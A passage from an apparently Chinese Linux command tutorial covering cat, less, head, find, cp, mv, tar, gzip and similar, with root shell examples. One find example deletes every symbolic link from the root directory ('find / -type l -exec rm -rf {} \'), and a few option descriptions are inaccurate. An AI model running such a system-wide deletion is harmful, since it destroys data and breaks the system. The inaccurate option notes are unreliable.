<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> [-AbEnTv]</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-A ：相当于 -vET 的整合选项，可列出一些特殊字符而不是空白而已；</p>
</li>
<li class="lvl-2">
<p>-v ：列出一些看不出来的特殊字符</p>
</li>
<li class="lvl-2">
<p>-E ：将结尾的断行字节 $ 显示出来；</p>
</li>
<li class="lvl-2">
<p>-T ：将 [tab] 按键以 ^I 显示出来；</p>
</li>
<li class="lvl-2">
<p>-b ：列出行号，空白行不标行号</p>
</li>
<li class="lvl-2">
<p>-n ：列出行号，连同空白行也会有行号</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">cat</span> -b /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line"></span><br><span class="line">[root@rocky8:/]# <span class="built_in">cat</span> -n /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line">     3</span><br></pre></td></tr></table></figure>
<p>tac与cat命令刚好相反，文件内容从最后一行开始显示，可以看出 tac 是 cat 的倒着写！如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">tac</span> /etc/issue</span><br><span class="line"></span><br><span class="line">Kernel \r on an \m</span><br><span class="line">\S</span><br></pre></td></tr></table></figure>
<h4 id="显示行号：nl">显示行号：nl</h4>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> [-bnw] 文件</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-b ：指定行号指定的方式，主要有两种：<br>
-b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)；<br>
-b t ：如果有空行，空的那一行不要列出行号(默认值)；</p>
</li>
<li class="lvl-2">
<p>-n ：列出行号表示的方法，主要有三种：<br>
-n ln ：行号在荧幕的最左方显示；<br>
-n rn ：行号在自己栏位的最右方显示，且不加 0 ；<br>
-n rz ：行号在自己栏位的最右方显示，且加 0 ；</p>
</li>
<li class="lvl-2">
<p>-w ：行号栏位的占用的位数。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">nl</span> /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line">       </span><br></pre></td></tr></table></figure>
<h4 id="分屏显示：more、less">分屏显示：more、less</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# more /etc/man_db.config </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Generated automatically from man.conf.in by the</span></span><br><span class="line"><span class="comment"># configure script.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># man.conf from man-1.6d</span></span><br><span class="line">....(中间省略)....</span><br><span class="line">--More--(28%)  &lt;== 光标在这里等待命令</span><br></pre></td></tr></table></figure>
<p>more运行时可以输入的命令有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>空白键 (space)：代表向下翻一页；</p>
</li>
<li class="lvl-2">
<p>Enter ：代表向下翻『一行』；</p>
</li>
<li class="lvl-2">
<p>/字串 ：代表在这个显示的内容当中，向下搜寻『字串』这个关键字；</p>
</li>
<li class="lvl-2">
<p>:f ：立刻显示出档名以及目前显示的行数；</p>
</li>
<li class="lvl-2">
<p>q ：代表立刻离开 more ，不再显示该文件内容。</p>
</li>
<li class="lvl-2">
<p>b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# less /etc/man.config</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Generated automatically from man.conf.in by the</span></span><br><span class="line"><span class="comment"># configure script.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># man.conf from man-1.6d</span></span><br><span class="line">....(中间省略)....</span><br><span class="line">:   &lt;== 这里可以等待你输入命令！</span><br></pre></td></tr></table></figure>
<p>less运行时可以输入的命令有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>空白键 ：向下翻动一页；</p>
</li>
<li class="lvl-2">
<p>[pagedown]：向下翻动一页；</p>
</li>
<li class="lvl-2">
<p>[pageup] ：向上翻动一页；</p>
</li>
<li class="lvl-2">
<p>/字串 ：向下搜寻『字串』的功能；</p>
</li>
<li class="lvl-2">
<p>?字串 ：向上搜寻『字串』的功能；</p>
</li>
<li class="lvl-2">
<p>n ：重复前一个搜寻 (与 / 或 ? 有关！)</p>
</li>
<li class="lvl-2">
<p>N ：反向的重复前一个搜寻 (与 / 或 ? 有关！)</p>
</li>
<li class="lvl-2">
<p>q ：离开 less 这个程序；</p>
</li>
</ul>
<h4 id="取首尾n行：head、tail">取首尾n行：head、tail</h4>
<p>head取出文件前面几行</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> [-n number] 文件 </span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-n ：后面接数字，代表显示几行的意思</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> /etc/man.config</span><br></pre></td></tr></table></figure>
<p>默认的情况中，显示前面 10 行！若要显示前 20 行，就得要这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> -n 20 /etc/man.config</span><br></pre></td></tr></table></figure>
<p>tail取出文件后面几行</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> [-n number] 文件 </span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-n ：后面接数字，代表显示几行的意思</p>
</li>
<li class="lvl-2">
<p>-f ：表示持续侦测后面所接的档名，要等到按下[ctrl]-c才会结束tail的侦测</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">tail</span> /etc/man.config</span><br><span class="line"><span class="comment"># 默认的情况中，显示最后的十行！若要显示最后的 20 行，就得要这样：</span></span><br><span class="line">[root@rocky8:~]# <span class="built_in">tail</span> -n 20 /etc/man.config</span><br></pre></td></tr></table></figure>
<h4 id="显示当前路径：pwd">显示当前路径：pwd</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">pwd</span></span><br><span class="line">/root</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>-P</strong> ：显示出确实的路径，而非使用连结 (link) 路径。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cd</span> /var/mail</span><br><span class="line">[root@rocky8:mail]# <span class="built_in">pwd</span></span><br><span class="line">/var/mail</span><br><span class="line">[root@rocky8:mail]# <span class="built_in">pwd</span> -P</span><br><span class="line">/var/spool/mail</span><br></pre></td></tr></table></figure>
<h2 id="文件操作">文件操作</h2>
<h4 id="创建目录：mkdir">创建目录：mkdir</h4>
<p>mkdir可以创建一个新的目录。</p>
<p>注意：新建目录的名称不能与当前目录中已有的目录或文件同名，并且目录创建者必须对当前目录具有写权限。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> [-mp] 目录名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-m ：指定被创建目录的权限，而不是根据默认权限 (umask) 设定</p>
</li>
<li class="lvl-2">
<p>-p ：递归创建所需要的目录</p>
</li>
</ul>
<p>实例：-p递归创建目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cd</span> /tmp</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> <span class="built_in">test</span>	&lt;==创建一名为 <span class="built_in">test</span> 的新目录</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> test1/test2/test3/test4</span><br><span class="line"><span class="built_in">mkdir</span>: cannot create directory ‘test1/test2/test3/test4’: No such file or directory		&lt;== 没办法直接创建此目录啊！</span><br><span class="line">[root@rocky8:tmp]# <span class="built_in">mkdir</span> -p test1/test2/test3/test4</span><br></pre></td></tr></table></figure>
<p>mkdir创建的目录权限默认根据umask得到，而-m参数可以指定被创建目录的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">mkdir</span> t1</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x. 2 root root 6 Feb 20 15:06 t1</span><br><span class="line">[root@rocky8:~]# <span class="built_in">mkdir</span> t2 -m 711</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x. 2 root root 6 Feb 20 15:06 t1</span><br><span class="line">drwx--x--x. 2 root root 6 Feb 20 15:06 t2</span><br></pre></td></tr></table></figure>
<h4 id="删除文件：rm">删除文件：rm</h4>
<p>可通过rm删除文件或目录。使用rm命令要小心，因为文件删除后不能恢复。为了防止文件误删，可以在rm后使用-i参数以逐个确认要删除的文件。</p>
<p>常用参数及含义如下表所示：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>以进行交互式方式执行</td>
</tr>
<tr>
<td>-f</td>
<td>强制删除，忽略不存在的文件，无需提示</td>
</tr>
<tr>
<td>-r</td>
<td>递归地删除目录下的内容，删除文件夹时必须加此参数</td>
</tr>
</tbody>
</table>
<p>####ln： 建立链接文件</p>
<p>软链接：ln -s 源文件 链接文件</p>
<p>硬链接：ln 源文件 链接文件</p>
<p>软链接类似于Windows下的快捷方式，如果软链接文件和源文件不在同一个目录，源文件要使用绝对路径，不能使用相对路径。</p>
<p>硬链接只能链接普通文件不能链接目录。 两个文件占用相同大小的硬盘空间，即使删除了源文件，链接文件还是存在，所以-s选项是更常见的形式。</p>
<h4 id="rename：修改文件名">rename：修改文件名</h4>
<p>rename命令是在Linux和Unix系统中使用的一个命令，用于批量重命名文件或目录。支持正则表达式。基本语法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rename [选项] 表达式 替换的字符 文件...</span><br></pre></td></tr></table></figure>
<p>命令选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line"> rename [options] &lt;expression&gt; &lt;replacement&gt; &lt;file&gt;...</span><br><span class="line"></span><br><span class="line">Rename files.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -v, --verbose       explain what is being <span class="keyword">done</span></span><br><span class="line"> -s, --symlink       act on the target of symlinks</span><br><span class="line"> -n, --no-act        <span class="keyword">do</span> not make any changes</span><br><span class="line"> -o, --no-overwrite  don<span class="string">&#x27;t overwrite existing files</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> -h, --help          display this help</span></span><br><span class="line"><span class="string"> -V, --version       display version</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For more details see rename(1).</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>下面是rename命令的常用选项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-v, --verbose : 显示详细的操作信息 </span><br><span class="line">-s, --symlink : 对符号链接目标进行操作</span><br><span class="line">-h, --<span class="built_in">help</span> : 显示帮助信息并退出 </span><br><span class="line">-V, --version : 显示版本信息并退出</span><br></pre></td></tr></table></figure>
<p>实例1：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename -v file afile file0?</span><br><span class="line">`file01<span class="string">&#x27; -&gt; `afile01&#x27;</span></span><br><span class="line">`file02<span class="string">&#x27; -&gt; `afile02&#x27;</span></span><br><span class="line">`file03<span class="string">&#x27; -&gt; `afile03&#x27;</span></span><br><span class="line">`file04<span class="string">&#x27; -&gt; `afile04&#x27;</span></span><br><span class="line">`file05<span class="string">&#x27; -&gt; `afile05&#x27;</span></span><br><span class="line">`file06<span class="string">&#x27; -&gt; `afile06&#x27;</span></span><br><span class="line">`file07<span class="string">&#x27; -&gt; `afile07&#x27;</span></span><br><span class="line">`file08<span class="string">&#x27; -&gt; `afile08&#x27;</span></span><br><span class="line">`file09<span class="string">&#x27; -&gt; `afile09&#x27;</span></span><br></pre></td></tr></table></figure>
<p>实例2：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename file afile *</span><br><span class="line">[root@rocky8:~]#<span class="built_in">ls</span></span><br><span class="line">aafile01  aafile09  afile017  afile025  afile033  afile041  afile049  afile057  afile065  afile073  afile081  afile089  afile097......</span><br></pre></td></tr></table></figure>
<h4 id="grep：文本搜索">grep：文本搜索</h4>
<p>Linux系统中grep命令是一种强大的文本搜索工具，grep允许对文本文件进行模式查找。如果找到匹配模式， grep打印包含模式的所有行。</p>
<p>grep一般格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep [-选项] <span class="string">&#x27;搜索内容串&#x27;</span> 文件名</span><br></pre></td></tr></table></figure>
<p>在grep命令中输入字符串参数时，最好引号或双引号括起来。例如：<code>grep 'a' 1.txt</code>。</p>
<p>在当前目录中，查找前缀有test字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep <span class="built_in">test</span> <span class="built_in">test</span>* <span class="comment">#查找前缀有test的文件包含test字符串的文件  </span></span><br><span class="line">testfile1:This a Linux testfile! <span class="comment">#列出testfile1 文件中包含test字符的行  </span></span><br><span class="line">testfile_2:This is a linux testfile! <span class="comment">#列出testfile_2 文件中包含test字符的行  </span></span><br><span class="line">testfile_2:Linux <span class="built_in">test</span> <span class="comment">#列出testfile_2 文件中包含test字符的行 </span></span><br></pre></td></tr></table></figure>
<p>以递归的方式查找符合条件的文件。例如，查找指定目录/etc/acpi 及其子目录（如果存在子目录的话）下所有文件中包含字符串&quot;update&quot;的文件，并打印出该字符串所在行的内容，使用的命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -r update /etc/acpi <span class="comment">#以递归的方式查找“etc/acpi”  </span></span><br><span class="line"><span class="comment">#下包含“update”的文件  </span></span><br><span class="line">/etc/acpi/ac.d/85-anacron.sh:# (Things like the slocate updatedb cause a lot of IO.)  </span><br><span class="line">Rather than  </span><br><span class="line">/etc/acpi/resume.d/85-anacron.sh:# (Things like the slocate updatedb cause a lot of  </span><br><span class="line">IO.) Rather than  </span><br><span class="line">/etc/acpi/events/thinkpad-cmos:action=/usr/sbin/thinkpad-keys--update </span><br></pre></td></tr></table></figure>
<p>反向查找。前面各个例子是查找并打印出符合条件的行，通过&quot;-v&quot;参数可以打印出不符合条件行的内容。</p>
<p>查找文件名中包含 test 的文件中不包含test 的行，此时，使用的命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -v <span class="built_in">test</span>* <span class="comment">#查找文件名中包含test 的文件中不包含test 的行  </span></span><br><span class="line">testfile1:helLinux!  </span><br><span class="line">testfile1:Linis a free Unix-<span class="built_in">type</span> operating system.  </span><br><span class="line">testfile1:Lin  </span><br><span class="line">testfile_1:HELLO LINUX!  </span><br><span class="line">testfile_1:LINUX IS A FREE UNIX-TYPE OPTERATING SYSTEM.  </span><br><span class="line">testfile_1:THIS IS A LINUX TESTFILE!  </span><br><span class="line">testfile_2:HELLO LINUX!  </span><br><span class="line">testfile_2:Linux is a free unix-type opterating system.  </span><br></pre></td></tr></table></figure>
<h4 id="查找文件：find">查找文件：find</h4>
<p>常用用法：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>find ./ -name <a href="http://test.sh">test.sh</a></td>
<td>查找当前目录下所有名为test.sh的文件</td>
</tr>
<tr>
<td>find ./ -name ‘*.sh’</td>
<td>查找当前目录下所有后缀为.sh的文件</td>
</tr>
<tr>
<td>find ./ -name “[A-Z]*”</td>
<td>查找当前目录下所有以大写字母开头的文件</td>
</tr>
<tr>
<td>find /tmp -size 2M</td>
<td>查找在/tmp 目录下等于2M的文件</td>
</tr>
<tr>
<td>find /tmp -size +2M</td>
<td>查找在/tmp 目录下大于2M的文件</td>
</tr>
<tr>
<td>find /tmp -size -2M</td>
<td>查找在/tmp 目录下小于2M的文件</td>
</tr>
<tr>
<td>find ./ -size +4k -size -5M</td>
<td>查找当前目录下大于4k，小于5M的文件</td>
</tr>
<tr>
<td>find ./ -perm 0777</td>
<td>查找当前目录下权限为 777 的文件或目录</td>
</tr>
</tbody>
</table>
<p>Linux find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find path -option [ -<span class="built_in">print</span> ] [ -<span class="built_in">exec</span> -ok <span class="built_in">command</span> ] &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p><strong>常用参数说明</strong> :</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-perm xxxx：权限为 xxxx的文件或目录</p>
</li>
<li class="lvl-2">
<p>-user： 按照文件属主来查找文件。</p>
</li>
<li class="lvl-2">
<p>-size n : n单位,b:512位元组的区块,c:字元数,k:kilo bytes,w:二个位元组</p>
</li>
<li class="lvl-2">
<p>-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</p>
</li>
<li class="lvl-2">
<p>-amin n : 在过去 n 分钟内被读取过</p>
</li>
<li class="lvl-2">
<p>-anewer file : 比文件 file 更晚被读取过的文件</p>
</li>
<li class="lvl-2">
<p>-atime n : 在过去n天内被读取过的文件</p>
</li>
<li class="lvl-2">
<p>-cmin n : 在过去 n 分钟内被修改过</p>
</li>
<li class="lvl-2">
<p>-cnewer file :比文件 file 更新的文件</p>
</li>
<li class="lvl-2">
<p>-ctime n : 在过去n天内被修改过的文件</p>
</li>
<li class="lvl-2">
<p>-empty : 空的文件</p>
</li>
<li class="lvl-2">
<p>-gid n or -group name : gid 是 n 或是 group 名称是 name</p>
</li>
<li class="lvl-2">
<p>-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</p>
</li>
<li class="lvl-2">
<p>-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</p>
</li>
<li class="lvl-2">
<p>-type 查找某一类型的文件：</p>
<ul class="lvl-2">
<li class="lvl-4">b - 块设备文件</li>
<li class="lvl-4">d - 目录</li>
<li class="lvl-4">c - 字符设备文件</li>
<li class="lvl-4">p - 管道文件</li>
<li class="lvl-4">l - 符号链接文件</li>
<li class="lvl-4">f - 普通文件</li>
</ul>
</li>
<li class="lvl-2">
<p>-exec 命令名{} \ (注意：“}”和“\”之间有空格)</p>
</li>
</ul>
<p>find实例：</p>
<p>显示当前目录中大于20字节并以.c结尾的文件名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name <span class="string">&quot;*.c&quot;</span> -size +20c </span><br></pre></td></tr></table></figure>
<p>将目前目录其其下子目录中所有一般文件列出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
<p>将目前目录及其子目录下所有最近 20 天内更新过的文件列出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -ctime -20</span><br></pre></td></tr></table></figure>
<p>查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/log -<span class="built_in">type</span> f -mtime +7 -ok <span class="built_in">rm</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -perm 644 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>查找系统中所有文件长度为0的普通文件，并列出它们的完整路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size 0 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>从根目录查找类型为符号链接的文件，并将其删除：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> l -<span class="built_in">exec</span> <span class="built_in">rm</span> -rf &#123;&#125; \</span><br></pre></td></tr></table></figure>
<p>从当前目录查找用户tom的所有文件并显示在屏幕上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -user tom</span><br></pre></td></tr></table></figure>
<p>在当前目录中查找所有文件以.doc结尾，且更改时间在3天以上的文件，找到后删除，并且给出删除提示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name *.doc  -mtime +3 -ok <span class="built_in">rm</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>在当前目录下查找所有链接文件，并且以长格式显示文件的基本信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> l -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>在当前目录下查找文件名有一个小写字母、一个大写字母、两个数字组成，且扩展名为.doc的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name <span class="string">&#x27;[a-z][A-Z][0-9][0-9].doc&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="拷贝文件：cp">拷贝文件：cp</h4>
<p>cp命令的功能是将给出的文件或目录复制到另一个文件或目录中，相当于DOS下的copy命令。</p>
<p>常用选项说明：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>该选项通常在复制目录时使用，它保留链接、文件属性，并递归地复制目录，简单而言，保持文件原有属性。</td>
</tr>
<tr>
<td>-f</td>
<td>已经存在的目标文件而不提示</td>
</tr>
<tr>
<td>-i</td>
<td>交互式复制，在覆盖目标文件之前将给出提示要求用户确认</td>
</tr>
<tr>
<td>-r</td>
<td>若给出的源文件是目录文件，则cp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名。</td>
</tr>
<tr>
<td>-v</td>
<td>显示拷贝进度</td>
</tr>
<tr>
<td>-l</td>
<td>创建硬链接(hard link)，而非复制文件本身</td>
</tr>
<tr>
<td>-s</td>
<td>复制成为符号链接 (symbolic link)，相当于批量创建快捷方式</td>
</tr>
<tr>
<td>-u</td>
<td>若 destination 比 source 旧才升级 destination ！</td>
</tr>
</tbody>
</table>
<p>cp vim_configure/ code/ -ivr 把文件夹 vim_configure 拷贝到 code 目录里。</p>
<h4 id="移动文件：mv">移动文件：mv</h4>
<p>mv命令用来移动文件或目录，也可以给文件或目录重命名。</p>
<p>常用选项说明：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-f</td>
<td>禁止交互式操作，如有覆盖也不会给出提示</td>
</tr>
<tr>
<td>-i</td>
<td>确认交互方式操作，如果mv操作将导致对已存在的目标文件的覆盖，系统会询问是否重写，要求用户回答以避免误覆盖文件</td>
</tr>
<tr>
<td>-v</td>
<td>显示移动进度</td>
</tr>
</tbody>
</table>
<p>mv可以修改文件名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#ll</span><br><span class="line">total 4</span><br><span class="line">-rw-------. 1 root root 1256 Feb 18 21:18 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root    0 Feb 19 11:43 test.txt</span><br><span class="line">[root@rocky8:~]#<span class="built_in">mv</span> test.txt <span class="built_in">test</span></span><br><span class="line">[root@rocky8:~]#ll</span><br><span class="line">total 4</span><br><span class="line">-rw-------. 1 root root 1256 Feb 18 21:18 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root    0 Feb 19 11:43 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h4 id="归档管理：tar">归档管理：tar</h4>
<p>此命令可以把一系列文件归档到一个大文件中，也可以把档案文件解开以恢复数据。</p>
<p>tar使用格式 tar [参数] 打包文件名 文件</p>
<p>tar命令参数很特殊，其参数前面可以使用“-”，也可以不使用。</p>
<p>常用参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-c</td>
<td>生成档案文件，创建打包文件</td>
</tr>
<tr>
<td>-v</td>
<td>列出归档解档的详细过程，显示进度</td>
</tr>
<tr>
<td>-f</td>
<td>指定档案文件名称，f后面一定是.tar文件，所以必须放选项最后</td>
</tr>
<tr>
<td>-t</td>
<td>列出档案中包含的文件</td>
</tr>
<tr>
<td>-x</td>
<td>解开档案文件</td>
</tr>
</tbody>
</table>
<p>注意：除了f需要放在参数的最后，其它参数的顺序任意。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# tar -cvf test.tar &#123;1..3&#125;.txt</span><br><span class="line">1.txt</span><br><span class="line">2.txt</span><br><span class="line">3.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 1.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 2.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 3.txt</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">rm</span> -rf *.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# tar -xvf test.tar </span><br><span class="line">1.txt</span><br><span class="line">2.txt</span><br><span class="line">3.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 1.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 2.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 3.txt</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br></pre></td></tr></table></figure>
<h4 id="文件压缩解压：gzip、bzip2">文件压缩解压：gzip、bzip2</h4>
<p>tar与gzip命令结合使用实现文件打包、压缩。 tar只负责打包文件，但不压缩，用gzip压缩tar打包后的文件，其扩展名一般用xxxx.tar.gz。</p>
<p>gzip使用格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzip  [选项]  被压缩文件</span><br></pre></td></tr></table></figure>
<p>常用选项：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>解压文件</td>
</tr>
<tr>
<td>-r</td>
<td>压缩文件</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# gzip -r test.tar test.tar.gz  ==&gt;或者:gzip test.tar</span><br><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 131 Feb 20 15:14 test.tar.gz</span><br><span class="line">[root@rocky8:~]# gzip -d test.tar.gz </span><br><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br></pre></td></tr></table></figure>
<p>tar命令中-z选项可以调用gzip实现了一个压缩的功能，实行一个先打包后压缩的过程。</p>
<p>压缩用法：tar zcvf 压缩包包名 文件1 文件2 …</p>
<p>例如： tar zcvf test.tar.gz 1.c 2.c 3.c 4.c把 1.c 2.c 3.c 4.c 压缩成 test.tar.gz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c</span><br><span class="line">[root@rocky8:~]# tar -zcvf test.tar.gz &#123;1..4&#125;.c</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  test.tar.gz</span><br><span class="line">[root@rocky8:~]# gzip -d test.tar.gz </span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  test.tar</span><br></pre></td></tr></table></figure>
<p>解压用法： tar zxvf 压缩包包名</p>
<p>例如：</p>
